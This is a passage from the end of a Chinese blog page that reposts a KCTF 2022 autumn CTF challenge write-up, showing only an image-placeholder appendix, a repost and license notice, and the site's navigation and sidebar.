+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/81346.html">https://www.ctfiot.com/81346.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E7%9C%8B%E9%9B%AA2022_KCTF_%E7%A7%8B%E5%AD%A3%E8%B5%9B_-_%E7%AC%AC%E4%BA%94%E9%A2%98%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90.full.md">CTF大赛WP集合&#x2F;articles&#x2F;看雪2022_KCTF_秋季赛_-_第五题设计思路及解析.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Node-js-8/">Node.js 8</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Web/%E7%9C%8B%E9%9B%AA2022_KCTF_%E6%98%A5%E5%AD%A3%E8%B5%9B_-_%E7%AC%AC%E5%9B%9B%E9%A2%98%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/" title="看雪2022 KCTF 春季赛 | 第四题设计思路及解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">看雪2022 KCTF 春季赛 | 第四题设计思路及解析</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/%E7%AC%AC%E4%B8%89%E5%B1%8A-%E7%A5%A5%E4%BA%91%E6%9D%AF-CTF%E5%88%9D%E8%B5%9BWriteUp_By_EDISEC/" title="第三届&quot;祥云杯&quot;CTF初赛WriteUp By EDISEC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第三届&quot;祥云杯&quot;CTF初赛WriteUp By EDISEC</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
